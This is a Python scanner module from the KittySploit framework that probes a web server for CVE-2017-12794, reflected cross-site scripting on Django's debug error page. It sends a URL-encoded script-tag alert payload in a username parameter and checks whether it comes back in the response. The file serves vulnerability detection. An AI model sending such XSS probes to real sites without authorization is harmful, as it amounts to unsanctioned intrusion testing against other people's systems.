#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Django 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Django Debug Page - Cross-Site Scripting Detection',
        'description': 'Django 1.10.x before 1.10.8 and 1.11.x before 1.11.5 has HTML autoescaping disabled in a portion of the template for the technical 500 debug page. We detected that right circumstances (DEBUG=True) are present to allow a cross-site scripting attack.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'xss', 'django', 'djangoproject', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://twitter.com/sec715/status/1406779605055270914',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-12794',
            'https://www.djangoproject.com/weblog/2017/sep/05/security-releases/',
            'http://web.archive.org/web/20211207172022/https://securitytracker.com/id/1039264',
            'http://www.securitytracker.com/id/1039264',
        ],
        'cve': 'CVE-2017-12794',
    }

    def run(self):
        r = self.http_request(method="GET", path='/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Django Debug Page - Cross-Site Scripting detected",
                path='/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E',
            )
            return True
        return False

